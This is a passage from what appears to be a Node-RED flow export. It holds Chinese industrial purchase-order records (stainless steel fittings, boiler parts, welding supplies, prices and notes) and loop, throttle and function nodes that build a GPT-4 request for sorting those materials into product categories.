\"采购订单含税单价\": 220.0   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500015016,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"1#空压机机头采购\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 165000.0   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012911,     \"采购行项目\": 30,     \"物料编码\": \"WL1201001005013100090\",     \"物料描述\": \"10.8级单头螺栓12X60\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3.5   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500013334,     \"采购行项目\": 10,     \"物料编码\": \"WL0804003000003100154\",     \"物料描述\": \"10kV母线热缩管_Φ100/50\",     \"备注\": \"补计划，新汽轮机项目\",     \"到货基本计量单位\": \"米\",     \"采购订单含税单价\": 38.0   },   {     \"到货日期\": \"2022-07-25T00:00:00.000Z\",     \"采购订单号\": 4500012832,     \"采购行项目\": 10,     \"物料编码\": \"WL1109005000003100144\",     \"物料描述\": \"10t/h蒸馏水器专用进水连接管∮，18*4mm\",     \"备注\": null,     \"到货基本计量单位\": \"米\",     \"采购订单含税单价\": 16.5   },   {     \"到货日期\": \"2022-11-09T00:00:00.000Z\",     \"采购订单号\": 4500014487,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"120t/h板式干燥空气过滤器 1840*1840*1730mm\",     \"备注\": \"华渝涂装设备有限公司，去除产品中异物项目，401热鼓空气过滤器。相关要求交供应部。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 87300.0   },   {     \"到货日期\": \"2022-11-09T00:00:00.000Z\",     \"采购订单号\": 4500014487,     \"采购行项目\": 40,     \"物料编码\": null,     \"物料描述\": \"120t/h板式冷却空气过滤器 1840*1840*1730mm\",     \"备注\": \"华渝涂装设备有限公司，去除产品中异物项目，相关要求直接交供应\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 87300.0   },   {     \"到货日期\": \"2022-02-18T00:00:00.000Z\",     \"采购订单号\": 4500001116,     \"采购行项目\": 20,     \"物料编码\": \"WL1502001000003100004\",     \"物料描述\": \"12版秋装（冬装）\",     \"备注\": \"160、185码各200件，165、170、175、180码各300件，190、195码各50件。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 262.5   },   {     \"到货日期\": \"2022-12-26T00:00:00.000Z\",     \"采购订单号\": 4500013266,     \"采购行项目\": 10,     \"物料编码\": \"WL1502001000003100008\",     \"物料描述\": \"12版夏装\",     \"备注\": \"155码100套，160、165、170、175、180、185各200套。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 125.5   },   {     \"到货日期\": \"2022-12-26T00:00:00.000Z\",     \"采购订单号\": 4500013266,     \"采购行项目\": 20,     \"物料编码\": \"WL1502001000003100007\",     \"物料描述\": \"13版春装长袖\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 161.0   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 120,     \"物料编码\": \"WL1202001002003100477\",     \"物料描述\": \"150A瓷嘴10×30\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1.2   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 100,     \"物料编码\": \"WL1202001002003100475\",     \"物料描述\": \"150A瓷嘴4×30\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1.2   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 110,     \"物料编码\": \"WL1202001002003100476\",     \"物料描述\": \"150A瓷嘴6×30\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1.2   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 130,     \"物料编码\": \"WL1202001002003100478\",     \"物料描述\": \"150A钨针夹（紫铜）1.6×36\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3.5   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 140,     \"物料编码\": \"WL1202001002003100479\",     \"物料描述\": \"150A钨针夹（紫铜）2.0×36\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3.5   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 150,     \"物料编码\": \"WL1202001002003100480\",     \"物料描述\": \"150A钨针夹（紫铜）2.4×36\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3.5   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012811,     \"采购行项目\": 90,     \"物料编码\": \"WL1202001002003100474\",     \"物料描述\": \"150A氩弧焊枪\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 250.0   },   {     \"到货日期\": \"2023-03-16T00:00:00.000Z\",     \"采购订单号\": 4500019468,     \"采购行项目\": 60,     \"物料编码\": \"WL0902007000003100011\",     \"物料描述\": \"152巴歇尔槽（明渠流量计用）\",     \"备注\": \"环保废水在线排口流量计使用，不锈钢材质，具体尺寸有图纸，也有成品售卖\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3560.0   },   {     \"到货日期\": \"2022-06-10T00:00:00.000Z\",     \"采购订单号\": 4500011479,     \"采购行项目\": 10,     \"物料编码\": \"WL1002002000003100113\",     \"物料描述\": \"15CaMoG无缝管355X13\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 19.99   },   {     \"到货日期\": \"2023-09-01T00:00:00.000Z\",     \"采购订单号\": 4500023870,     \"采购行项目\": 90,     \"物料编码\": \"WL0905000000003120003\",     \"物料描述\": \"16路继电器开关量输入端子模块,SM3614\",     \"备注\": \"用于清水池排泥自动控制改造，公司项目，和利时\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 3760.0   },   {     \"到货日期\": \"2023-04-26T00:00:00.000Z\",     \"采购订单号\": 4500020349,     \"采购行项目\": 10,     \"物料编码\": \"WL1001002000003100013\",     \"物料描述\": \"2205不锈钢板S=12MM\",     \"备注\": \"9m2，罐子支承板使用\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 33.8   },   {     \"到货日期\": \"2021-11-22T00:00:00.000Z\",     \"采购订单号\": 4500004516,     \"采购行项目\": 10,     \"物料编码\": \"WL1001002000003100025\",     \"物料描述\": \"2205不锈钢板S=3mm\",     \"备注\": \"3201加热室，上椎体内部衬板使用，2块\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 53.27   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500013109,     \"采购行项目\": 20,     \"物料编码\": \"WL1001002000003100018\",     \"物料描述\": \"2205不锈钢板S=6MM\",     \"备注\": \"为公司立项项目（去除产品中异物）材料采购计划，400m2\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 31.69   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014758,     \"采购行项目\": 140,     \"物料编码\": \"WL1001002000003100012\",     \"物料描述\": \"2205不锈钢板S=8MM\",     \"备注\": \"脱硫塔底部焊接用\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 34.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 160,     \"物料编码\": \"WL1105008000003100009\",     \"物料描述\": \"2205不锈钢大小头108X76\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 238.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 20,     \"物料编码\": \"WL1105008000003100015\",     \"物料描述\": \"2205不锈钢大小头108X89\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 790.01   },   {     \"到货日期\": \"2021-12-20T00:00:00.000Z\",     \"采购订单号\": 4500005782,     \"采购行项目\": 10,     \"物料编码\": \"WL1105008000003100016\",     \"物料描述\": \"2205不锈钢大小头159X108\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 830.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 180,     \"物料编码\": \"WL1105008000003100012\",     \"物料描述\": \"2205不锈钢大小头159X133\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 830.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 170,     \"物料编码\": \"WL1105008000003100011\",     \"物料描述\": \"2205不锈钢大小头159X89\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 830.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 30,     \"物料编码\": \"WL1105008000003100017\",     \"物料描述\": \"2205不锈钢大小头219X133\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1580.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 40,     \"物料编码\": \"WL1105008000003100018\",     \"物料描述\": \"2205不锈钢大小头219X159\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1580.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 10,     \"物料编码\": \"WL1105008000003100014\",     \"物料描述\": \"2205不锈钢大小头76X57\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 230.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 150,     \"物料编码\": \"WL1105008000003100007\",     \"物料描述\": \"2205不锈钢大小头89X76\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 230.0   },   {     \"到货日期\": \"2021-12-16T00:00:00.000Z\",     \"采购订单号\": 4500005364,     \"采购行项目\": 60,     \"物料编码\": \"WL1105001000003100005\",     \"物料描述\": \"2205不锈钢法兰DN100\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1560.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 60,     \"物料编码\": \"WL1105001000003100013\",     \"物料描述\": \"2205不锈钢法兰DN125\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1570.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 10,     \"物料编码\": \"WL1105001000003100010\",     \"物料描述\": \"2205不锈钢法兰DN20\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 44.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 20,     \"物料编码\": \"WL1105001000003100007\",     \"物料描述\": \"2205不锈钢法兰DN25\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 86.0   },   {     \"到货日期\": \"2023-08-15T00:00:00.000Z\",     \"采购订单号\": 4500023145,     \"采购行项目\": 40,     \"物料编码\": \"WL1105001000003100011\",     \"物料描述\": \"2205不锈钢法兰DN350\",     \"备注\": \"4#锅炉烟气质量的提质与改造科技项目\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2850.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 30,     \"物料编码\": \"WL1105001000003100006\",     \"物料描述\": \"2205不锈钢法兰DN50\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 284.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 40,     \"物料编码\": \"WL1105001000003100009\",     \"物料描述\": \"2205不锈钢法兰DN65\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 294.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 50,     \"物料编码\": \"WL1105001000003100014\",     \"物料描述\": \"2205不锈钢法兰DN80\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 529.0   },   {     \"到货日期\": \"2023-06-01T00:00:00.000Z\",     \"采购订单号\": 4500021314,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100111\",     \"物料描述\": \"2205不锈钢管  Φ16×2.5\",     \"备注\": \"6米，Ⅱ组罐401加松喷嘴管\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 68.0   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 20,     \"物料编码\": \"WL1002001000003100055\",     \"物料描述\": \"2205不锈钢管 φ38×3\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 55.5   },   {     \"到货日期\": \"2023-07-24T00:00:00.000Z\",     \"采购订单号\": 4500022829,     \"采购行项目\": 30,     \"物料编码\": \"WL1002001000003120001\",     \"物料描述\": \"2205不锈钢管 Φ57×3.5\",     \"备注\": \"3、4#浆液管回流管处更换\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.5   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100054\",     \"物料描述\": \"2205不锈钢管 φ76×4\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.0   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100035\",     \"物料描述\": \"2205不锈钢焊管57\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.3   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 20,     \"物料编码\": \"WL1002001000003100026\",     \"物料描述\": \"2205不锈钢焊管89X4\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.8   },   {     \"到货日期\": \"2023-08-21T00:00:00.000Z\",     \"采购订单号\": 4500023965,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002013100177\",     \"物料描述\": \"2205不锈钢六角螺栓14x120\",     \"备注\": \"返料螺输用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 25.61   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 60,     \"物料编码\": \"WL1201002002003100022\",     \"物料描述\": \"2205不锈钢螺帽M12\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2.8   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 70,     \"物料编码\": \"WL1201001002013100128\",     \"物料描述\": \"2205不锈钢螺栓12x45\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 6.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 150,     \"物料编码\": \"WL1201001002013100142\",     \"物料描述\": \"2205不锈钢螺栓16X70\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 15.8   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 160,     \"物料编码\": \"WL1201001002013100143\",     \"物料描述\": \"2205不锈钢螺栓16X80\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 16.5   },   {     \"到货日期\": \"2021-11-19T00:00:00.000Z\",     \"采购订单号\": 4500004391,     \"采购行项目\": 20,     \"物料编码\": \"WL1201001002013100171\",     \"物料描述\": \"2205不锈钢螺栓M12X50mm\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 8.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 170,     \"物料编码\": \"WL1201001002013100172\",     \"物料描述\": \"2205不锈钢螺栓M16X90mm\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 17.6   },   {     \"到货日期\": \"2022-10-25T00:00:00.000Z\",     \"采购订单号\": 4500015636,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002043100011\",     \"物料描述\": \"2205不锈钢双头螺栓  M20×350\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73.8   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 30,     \"物料编码\": \"WL1105004000003100009\",     \"物料描述\": \"2205不锈钢弯头DN100\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 960.0   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 10,     \"物料编码\": \"WL1105004000003100003\",     \"物料描述\": \"2205不锈钢弯头DN25\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 95.0   },   {     \"到货日期\": \"2023-06-15T00:00:00.000Z\",     \"采购订单号\": 4500021861,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100011\",     \"物料描述\": \"2205不锈钢弯头DN50\",     \"备注\": \"备件\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 66.0   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 70,     \"物料编码\": \"WL1105004000003100005\",     \"物料描述\": \"2205不锈钢弯头DN65\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 260.0   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100012\",     \"物料描述\": \"2205不锈钢弯头DN80\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 430.0   },   {     \"到货日期\": \"2022-12-26T00:00:00.000Z\",     \"采购订单号\": 4500016521,     \"采购行项目\": 10,     \"物料编码\": \"WL0901001000003100063\",     \"物料描述\": \"2205热电阻LDWZPKF-430205IT  2205  DN25 350X\",     \"备注\": \"耐腐防震热电阻，LDWZPKF-430205IT,PT100,2205,L=350×250,DN25\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 976.0   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 30,     \"物料编码\": \"WL1001002000003100001\",     \"物料描述\": \"2205双相不锈钢板S=10MM\",     \"备注\": \"单块面积1.5m*3m\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 34.3   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2209预热器上管箱\",     \"备注\": \"在确定供应商后，可联系采购申请人提供相关参数及其他数据。上管箱材质为2205不锈钢材质。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 80000.0   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2211预热器上封头 EHA900X8(图号)\",     \"备注\": \"2组罐211预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 85400.0   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2213预热器上封头 EHA700X8(图号)\",     \"备注\": \"2组罐213预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73200.0   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2214预热器\",     \"备注\": \"整体设备的1/4部分，主要材质为TA10/Q345R\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 136000.0   },   {     \"到货日期\": \"2023-07-18T00:00:00.000Z\",     \"采购订单号\": 4500023102,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100461\",     \"物料描述\": \"24套筒子加长\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 61.0   },   {     \"到货日期\": \"2023-07-04T00:00:00.000Z\",     \"采购订单号\": 4500019862,     \"采购行项目\": 10,     \"物料编码\": \"WL1101004000003100076\",     \"物料描述\": \"2507不锈钢球阀DN50 PN16\",     \"备注\": \"（试用）厂家：博雷控制系统有限公司，预热器酸洗管进口球阀（安装一年内出现本体泄漏问题，厂家免费更换）\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5400.0   },   {     \"到货日期\": \"2023-05-10T00:00:00.000Z\",     \"采购订单号\": 4500020641,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2组罐401、402散热片保温衣，厚度5cm\",     \"备注\": \"建议河北中能环、干燥机用此品牌保温衣\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2287.12   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 40,     \"物料编码\": \"WL0740000000003100117\",     \"物料描述\": \"3#锅炉返料风风帽，附图：2383.702.1\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100111\",     \"物料描述\": \"3#锅炉风帽导管  附图(G2383.702.1-2)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 123.99   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 10,     \"物料编码\": \"WL0740000000003100102\",     \"物料描述\": \"3#锅炉炉床风帽附图（G2383.702.1-1)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 210.0   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500007815,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100110\",     \"物料描述\": \"3#锅炉水冷壁让管\",     \"备注\": \"四川亚丰\",     \"到货基本计量单位\": \"件\",     \"采购订单含税单价\": 4125.0   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 30,     \"物料编码\": \"WL0740000000003100116\",     \"物料描述\": \"3#锅炉松动风风帽，附图：2383.702.2\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-06-13T00:00:00.000Z\",     \"采购订单号\": 4500008097,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100388\",     \"物料描述\": \"3#炉氨水喷枪YFPQ-6/50\",     \"备注\": \"厂家：四川亚丰电力工程技术有限公司。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5000.0   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 50,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机调节风门\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 122180.0   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 40,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机消音器\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 193640.0   }]",
        "enumerationType": "json",
        "limit": "",
        "loopPayload": "loop-keep",
        "finalPayload": "final-count",
        "x": 390,
        "y": 800,
        "wires": [
            [],
            [
                "5dd097e5cfe18253"
            ]
        ]
    },
    {
        "id": "fa73fabd8d292c7b",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "enum",
        "count": "",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "origin",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 700,
        "y": 1660,
        "wires": [
            [],
            [
                "2a4bb85621f41e7a",
                "545b0d0f3ed89f3e"
            ]
        ]
    },
    {
        "id": "8ee076f0aa5dffd0",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "enum",
        "count": "",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "origin",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 810,
        "y": 2460,
        "wires": [
            [],
            [
                "66e1c7b638ac4334",
                "a3b3614cfcfe7373"
            ]
        ]
    },
    {
        "id": "23a38d62ce86fa03",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "fcnt",
        "count": "2",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "5387",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 850,
        "y": 3460,
        "wires": [
            [],
            [
                "4fafe91522852f66",
                "4b061872eaf0c741"
            ]
        ]
    },
    {
        "id": "962bfad74023fbed",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "fcnt",
        "count": "2",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "5387",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 790,
        "y": 3843,
        "wires": [
            [],
            [
                "97d333e2b6ce463f",
                "34faefb34f6b12f7"
            ]
        ]
    },
    {
        "id": "6c72d18a93156c2d",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "fcnt",
        "count": "1",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "5387",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 770,
        "y": 4460,
        "wires": [
            [],
            [
                "ddc4d0832f32d870",
                "cf51296f263ea131"
            ]
        ]
    },
    {
        "id": "e176467d7d3aa1c8",
        "type": "delay",
        "z": "b067bc3695a453e9",
        "g": "df53317ca4071932",
        "name": "Throttle Batches",
        "pauseType": "rate",
        "timeout": "1",
        "timeoutUnits": "minutes",
        "rate": "1",
        "nbRateUnits": "40",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 860,
        "y": 160,
        "wires": [
            [
                "2d4c49f03f981418",
                "90d6bb7e85e30ccd"
            ]
        ]
    },
    {
        "id": "90d6bb7e85e30ccd",
        "type": "function-gpt",
        "z": "b067bc3695a453e9",
        "g": "76e8b9242409efb9",
        "name": "function-gpt 9",
        "config": "44c9c8af11a9f982",
        "func": "//$PROMPT: 构筑一个发给chatgpt gpt-4接口的api body,将收到的json作为字符串填入content\n\nlet requestData = msg.payload; // Assuming you receive the JSON object through msg.payload\n\n// Convert JSON object to string\nconst payloadString = JSON.stringify(requestData);\n\n// Construct API body with converted string\nlet apiBody = {\n            model: \"gpt-4-1106-preview\",\n            messages: [{\n                role: 'user',\n                content: '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式遵循\"物料名称:,一级类目：“，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + payloadString\n            \n        }]\n    };\n\n// Add apiBody to message\nmsg.payload = apiBody;\n\n// Output modified message\nreturn msg;\n\n",
        "outputs": 1,
        "noerr": 0,
